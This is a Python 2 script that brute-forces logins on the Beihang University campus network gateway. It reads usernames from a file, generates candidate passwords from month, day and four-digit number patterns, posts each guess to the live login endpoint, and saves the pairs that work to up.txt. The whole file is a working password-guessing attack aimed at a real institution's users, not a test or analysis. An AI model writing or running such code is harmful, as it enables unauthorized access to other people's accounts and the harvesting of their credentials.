import urllib2
import cookielib

import urllib
import hashlib

import LoginEncode

class XiaoyuanLogin:
	def __init__(self,username,pwd,enableProxy=False):
		print "Start to Login buaa..."

		self.username = username
		self.password = pwd
		self.enableProxy = enableProxy

		self.serverUrl= "http://gw.buaa.edu.cn/cgi-bin/do_login"
		self.postHeader={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
							'Referer':'http://gw.buaa.edu.cn/'}

	def Login(self):
		self.EnableCookie(self.enableProxy)
		postData = LoginEncode.PostEncode(self.username,self.password)
		#print postData

		request = urllib2.Request(self.serverUrl,postData,self.postHeader)
		print "Post request..."

		try:
			result = urllib2.urlopen(request).read()
			#print result
			if result == "username_error":
				print result
				return False
			elif result == "password_error":
				print result
				return False
			else:
				return True
		except:
			print "Login error"
			return False

	def EnableCookie(self, enableProxy):
		cookie = cookielib.LWPCookieJar()
		cookie_support = urllib2.HTTPCookieProcessor(cookie)

		if enableProxy:
			proxy_support = urllib2.ProxyHandler({'http':'http://xxx.pac'})#use proxy server
			opener = urllib2.build_opener(proxy_support,cookie_support,urllib2.HTTPHandler)
			print "Proxy enabled"
		else:
			opener=urllib2.build_opener(cookie_support,urllib2.HTTPHandler)

		urllib2.install_opener(opener) # construct opener respondent to cookie


if __name__=='__main__':
	month = ['01','02','03','04','05','06','07','08','09','10','11','12']
	day = ['01','02','03','04','05','06','07','08','09','10','11','12','13',
       '14','15','16','17','18','19','20','21','22','23','24','25',
       '26','27','28','29','30','31']
	f = open('username.txt','r')
	for line in f.readlines():
		username = line.strip() #cut off the space at head and tail
		password = ''
		for i in range(1,2):#12 monthes a year
			tday = ''
			for j in range(8,9):#31 day a month
				tday = day[j]
				last = ''
				for k in range(5295,5298):
					if len(str(k)) == 1:
						last = '000'+str(k)
					elif len(str(k))==2:
						last = '00'+ str(k)
					elif  len(str(k)) == 3:
						last = '0'+ str(k)
					else:
						last = str(k)
					password = month[i]+day[j]+last
					mylogin = XiaoyuanLogin(username,password)
					if mylogin.Login() == True:
						print "[+]Login success!"
						print username + ':' + password
						fp = open('up.txt','a')
						fp.write(username+'\t'+password+'\n')
						fp.close()
					else:
						print "[+]Login failed!"
						print username+ ':'+ password
